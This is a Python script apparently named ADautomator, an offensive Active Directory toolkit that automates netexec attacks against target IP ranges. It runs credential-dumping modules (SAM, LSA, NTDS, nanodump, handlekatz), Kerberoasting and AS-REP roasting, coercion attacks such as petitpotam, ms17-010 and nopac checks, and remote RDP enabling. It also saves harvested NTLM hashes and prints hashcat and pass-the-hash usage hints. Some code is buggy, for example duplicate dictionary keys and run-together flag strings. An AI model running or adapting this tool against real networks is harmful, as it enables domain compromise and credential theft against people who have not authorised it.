import os
import subprocess
import sys
import re
import time
from datetime import datetime
import argparse
import contextlib



def print_banner():
    print(r"""  
            d8888 8888888b.                    888                                   888                    
           d88888 888  "Y88b                   888                                   888                    
          d88P888 888    888                   888                                   888                    
         d88P 888 888    888  8888b.  888  888 888888 .d88b.  88888b.d88b.   8888b.  888888 .d88b.  888d888 
        d88P  888 888    888     "88b 888  888 888   d88""88b 888 "888 "88b     "88b 888   d88""88b 888P"   
       d88P   888 888    888 .d888888 888  888 888   888  888 888  888  888 .d888888 888   888  888 888     
      d8888888888 888  .d88P 888  888 Y88b 888 Y88b. Y88..88P 888  888  888 888  888 Y88b. Y88..88P 888     
     d88P     888 8888888P"  "Y888888  "Y88888  "Y888 "Y88P"  888  888  888 "Y888888  "Y888 "Y88P"  888
    """)
    print("\nWritten by CB\n")
    print("\nAn Active Directory Cybersecurity Toolkit\n")
    print("\nVersion 1.0\n")

# Code to install packages
def install_packages(args):
    subprocess.run(['sudo', 'apt', 'install', 'seclists', '-y'])
    subprocess.run(['sudo', 'apt', 'install', 'netexec', '-y'])
    subprocess.run(['sudo', 'apt', 'install', 'ntpdate', '-y'])
    subprocess.run(['sudo', 'apt', 'install', 'python3-impacket', '-y'])
    subprocess.run(['wget', 'https://raw.githubusercontent.com/urbanadventurer/username-anarchy/master/format-plugins.rb'])
    subprocess.run(['wget', 'https://raw.githubusercontent.com/urbanadventurer/username-anarchy/master/username-anarchy'])
    print(f"Running Installation: {args.install}")
    print("Installing necessary packages...")

# Code to generate a timestamped filename
def generate_filename(ip):
    current_time = datetime.now().strftime('%d%b%y%H%M')
    filename = f"{ip}_{current_time}.txt"
    return filename

# Code to check lockout policy
def check_lockout_policy(output, ip_address):
    # Split the output into lines
    lines = output.split('\n')
    lockout_policy_detected = False

    for line in lines:
        # Check if the line contains lockout policy information
        if "Account Lockout Threshold:" in line and "None" not in line:
            lockout_policy_detected = True
            # Splitting the line by spaces and extracting the IP address
            parts = line.split()
            # Extract the IP address from the line
            extracted_ip = parts[1]  # Assuming the IP address is in the second position

            # Print the alert with the extracted IP address in red
            print(f"\033[91m\033[1mAlert: There is a lockout policy enabled on {extracted_ip}. Brute forcing usernames and passwords may cause a denial of service.\033[0m\033[0m")
    
    # If a lockout policy was detected, ask the user if they want to continue
    if lockout_policy_detected:
        try:
            print("Do you want to continue? (y/n): ", end='', flush=True)
            time.sleep(10)
            user_decision = input().strip().lower()
            return user_decision == 'y'
        except EOFError:
            print("\nNo input received. Exiting...")
            return False
    else:
        # If no lockout policy was detected, return True to continue
        return True

# Code to find NTLM hashes
def find_ntlm_hashes(output):
    # Regex pattern to capture the entire line from "SMB" to ":::"
    ntlm_hash_pattern = r'[^ ]+:\d+:aad3b435b51404eeaad3b435b51404ee:[a-f0-9]{32}:::'
    # Compile the pattern into a regular expression object
    compiled_ntlm_hash_pattern = re.compile(ntlm_hash_pattern)
    ntlm_hash_segments = compiled_ntlm_hash_pattern.findall(output)

    # Check if any NTLM hash segments were found
    if ntlm_hash_segments:
        print("\033[93m\033[1mAlert: Found NTLM hash segments! They will be saved.\033[0m\033[0m")
        print("\033[93m\033[1mTo crack: hashcat.exe -m 1000 -a 3 hashes.txt rockyou.txt -o cracked.txt.\033[0m\033[0m")
    
        if ntlm_hash_segments:
            print("\033[93m\033[1mAlert: Found NTLM hash segments! They will be saved.\033[0m\033[0m")
            for segment in ntlm_hash_segments:
                print(f"\033[93m{segment}\033[0m")  # Print each segment in yellow
        else:
            print("No NTLM hash segments found.")

        return ntlm_hash_segments

# Code to check if there are users detected when the --users flag is used
def check_users(output, ip_address):
    # Regex pattern to capture the username after the backslash and before the space
    username_pattern = r'\\([^:\\\s]+)\s'

    # Use the pattern to find usernames in the output
    usernames = re.findall(username_pattern, output)

    # Write the usernames to a file
    with open('users.txt', 'w') as file:
        for username in usernames:
            file.write(username + '\n')

    # Print the alert if any usernames were found
    if usernames:
        print("\033[93m\033[1mAlert: Found usernames! They will be saved as users.txt.\033[0m\033[0m")
        print("\033[93m\033[1mUSAGE: netexec smb IP -u users.txt -p password.txt\033[0m\033[0m")
        print("\033[93m\033[1mUSAGE: sudo python3 ADautomator.py --adnuke -u users.txt -p PASSWORD\033[0m\033[0m")
        

# Code to check if the IP address is pwned
def check_pwned(output, ip_address):
    pwned_lines = [line for line in output.split('\n') if "(Pwn3d!)" in line]

    for line in pwned_lines:
        # Splitting the line by spaces and extracting the IP address
        parts = line.split()
        # Assuming the IP address is in a specific position, adjust as needed
        ip_address = parts[1]  # Adjust the index based on your output format
        #Print the alert with the IP address in red
        print(f"\033[93m\033[1mAlert: YOU CAN LOG ONTO {ip_address}. USE PSEXEC, SMBEXEC, OR WMIEXEC TO LOG IN!!\033[0m\033[0m")

def check_rdp_status(output, ip_address):
    rdp_lines = [line for line in output.split('\n') if "RDP" in line]

    for line in rdp_lines:
        # Splitting the line by spaces and extracting the IP address
        parts = line.split()
        # Assuming the IP address is in a specific position, adjust as needed
        ip_address = parts[1]  # Adjust the index based on your output format
        #Print the alert with the IP address in red
        print(f"\033[93m\033[1mAlert: RDP IS NOW ENABLED {ip_address}.\033[0m\033[0m")


# Code to run ADNuke which is netexec with all smb and ldap flags set
def run_adnuke(ip_address, username, password, args):
    flag_checks = {
    '': check_pwned,
    '--pass-pol': check_lockout_policy,
    '--users': check_pwned,
    '--users': check_users,
    '--shares': check_pwned,
    '--sam': check_pwned,
    '--lsa': check_pwned,
    '--ntds': check_pwned,
    '--ntds vss': check_pwned,
    '--ntds-history': check_pwned,
    '-M rdp -o ACTION=enable': check_rdp_status,
    }

    # List of smb flags and modules to loop through
    smbflags = ['', '--pass-pol', '--users', '--shares', '--sessions', '--sam', '--lsa', 
                '--ntds', '--ntds vss', '-M rdp -o ACTION=enable', '-M dfscoerce', '-M enum_dns', 
                '-M get_netconnections', '-M gpp_autologin', '-M gpp_password',
                '-M handlekatz', '-M install_elevated', '-M ioxidresolver', 
                '-M keepass_discover', '-M masky', '-M ms17-010', '-M nopac',
                '-M nanodump', '-M petitpotam', '-M uac', '-M webdav', '-M wireless']

    ldapflags = ['', '--asreproast' 'asrep_hash.txt', '--kerberoasting' 'kerberos_hash.txt',
                '--trusted-for-delegation', '--password-not-required', '--admin-count', '--users',
                '--gmsa', '--get-sid', '-M MAQ', '-M adcs', '-M daclread', '-M get-desc-users',
                '-M get-network', '-M laps', '-M ldap-checker', '-M ldap-signing', '-M subnets',
                '-M user-desc', '-M whoami'] 
    
    # List to store all found hash segments
    all_ntlm_hash_segments = []

    # List of flags that require user input
    smbflags_requiring_input = ['-M ioxidresolver', '-M petitpotam']

    # Loop through all smb flags and modules
    for smbflag in smbflags:
        command = ['netexec', 'smb', args.ipaddress]
        if args.username:
            command.extend(['-u', args.username])
        if args.password:
            command.extend(['-p', args.password])
        if args.hash:
            command.extend(['-H', args.hash])
        command.extend(smbflag.split())  # Split smbflag into a list of its components
        
        print("Executing command:", " ".join(command))
        if smbflag in smbflags_requiring_input:
            # Send 'y' as input to the command
            result = subprocess.run(command, input='y\n', capture_output=True, text=True, encoding='utf-8')
        else:
            result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
           
        # Check if the output contains NTLM hash segments
        ntlm_hash_segments = find_ntlm_hashes(result.stdout)
        if ntlm_hash_segments:
            # Add the found hash segments to the list
            all_ntlm_hash_segments.extend(ntlm_hash_segments)
            
        # Check if the output contains any flags that require user input
        if smbflag in flag_checks:
            print(f"Checking flag: {smbflag}")
            should_continue = flag_checks[smbflag](result.stdout, args.ipaddress)
            print(f"Decision to continue: {should_continue}")
            if should_continue is not None and not should_continue:
                print("User chose not to continue. Exiting...")
                sys.exit(0) 

    # List of flags that require user input
    ldapflags_requiring_input = ['-M MAQ', '-M daclread', '-M laps', '-M subnets']
    
    # Loop through all ldap flags and modules
    for ldapflag in ldapflags:
        print(f"Processing flag: {ldapflag}")
        command = ['netexec', 'ldap', args.ipaddress]
        if args.username:
            command.extend(['-u', args.username])
        if args.password:
            command.extend(['-p', args.password])
        if args.hash:
            command.extend(['-H', args.hash])
        command.extend(ldapflag.split())  # Split ldapflag into a list of its components
        
        print("Executing command:", " ".join(command))
        if ldapflag in ldapflags_requiring_input:
            # Send 'y' as input to the command
            result = subprocess.run(command, input='y\n', capture_output=True, text=True, encoding='utf-8')
        else:
            result = subprocess.run(command, capture_output=True, text=True)
        print(result.stdout)
           
        # Check if the output contains NTLM hash segments
        ntlm_hash_segments = find_ntlm_hashes(result.stdout)
        if ntlm_hash_segments:
            # Add the found hash segments to the list
            all_ntlm_hash_segments.extend(ntlm_hash_segments)
            
        # Check if the output contains any flags that require user input
        if ldapflag in flag_checks:
            print(f"Checking flag: {ldapflag}")
            should_continue = flag_checks[ldapflag](result.stdout, args.ipaddress)
            print(f"Decision to continue: {should_continue}")
            if should_continue is not None and not should_continue:
                print("User chose not to continue. Exiting...")
                sys.exit(0)
    #Creates a file for the hashes
    timestamped_filename = f"ntlm_hash_{datetime.now().strftime('%d%b%y_%H%M')}.txt"

    with open(timestamped_filename, 'w') as file: # Open the file to write
        for segment in all_ntlm_hash_segments:
            file.write(segment + '\n') 

    with open(timestamped_filename, 'r') as file: # Open the file to read
        unique_hashes = set(file.readlines())
    with open(timestamped_filename, 'w') as file: # Open the file to write
        for hash_segment in unique_hashes:
            file.write(hash_segment)

# to save the output to a file
class DualOutput:
    def __init__(self, filename=None):
        self.terminal = sys.stdout
        self.log = open(filename, "w") if filename else None
    
    def write(self, message):
        self.terminal.write(message)
        if self.log:
            self.log.write(message)
    
    def flush(self):
        self.terminal.flush()
        if self.log:
            self.log.flush()

def main(args):
    original_stdout = sys.stdout  # Save the original stdout
    if args.output:
        sys.stdout = DualOutput(args.output)  # Redirect stdout to DualOutput

    print_banner()
    
    # Your existing code for handling different flags
    if args.install:
        # Code to handle installation
        print(f"Running Installation: {args.install}")
        install_packages(args) # Call the function to install packages
    
    if args.output:
        # Code to handle output
        print(f"Running Output: {args.output}")
        #run_output(args.ipaddress, args.username, args.password)
        sys.stdout = DualOutput(args.output) # Redirect stdout to a file

    if args.adnuke:
        # Code to handle ADNuke        
        print(f"Running ADNuke with options: {args.adnuke}")
        run_adnuke(args.ipaddress, args.username, args.password, args)    

    if args.kerbrute:
        # Code to handle Kerbrute
        print(f"Running Kerbrute with options: {args.kerbrute}")
        #run_kerbrute(args.ipaddress, args.username, args.password)

    # MAKE SURE TO KEEP THIS LAST - Reset stdout to its original value
    if args.output:
        sys.stdout.log.close()
        sys.stdout = sys.__stdout__


if __name__ == "__main__":
    # Argument Parser Setup
    parser = argparse.ArgumentParser(description="An Active Directory Cybersecurity Toolkit",
                                     epilog="Examples:\n"
    "  ADautomator.py --install\n"  
    "  ADautomator.py --adnuke -ip 192.168.56.0/24\n"
    "  ADautomator.py --adnuke -ip 192.168.56.0/24 -u username -p password -out output.txt\n"
    "  ADautomator.py --adnuke -ip targets.txt -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 -out testout.txt\n",
    formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-d', '--domain', help='Domain name'), 
    parser.add_argument('-ip', '--ipaddress', help='IP address of the targets, CIDR, or file with IPs'),
    parser.add_argument('-out', '--output', help='Output results to a file', type=str)
    parser.add_argument('--install', help='Install necessary packages', action='store_true')
    parser.add_argument('-u', '--username', help='Username for any tool', default='')
    parser.add_argument('-p', '--password', help='Password for any tool', default='')
    parser.add_argument('-H', '--hash', help='Hash for any tool', default='')
    parser.add_argument("--adnuke", help="Run netexec with DC IP, username, password and all smb and ldap flags set", action='store_true')
    parser.add_argument("--kerbrute", help="Run Kerbrute with specified options", nargs='*', type=str)
    args = parser.parse_args()
    
    if not any([args.adnuke, args.install]):
        parser.error("You must use one of the following --adnuke or --install")
    
    if args.adnuke and not args.ipaddress:
        parser.error("--adnuke requires --ip to be specified")
    
    main(args)
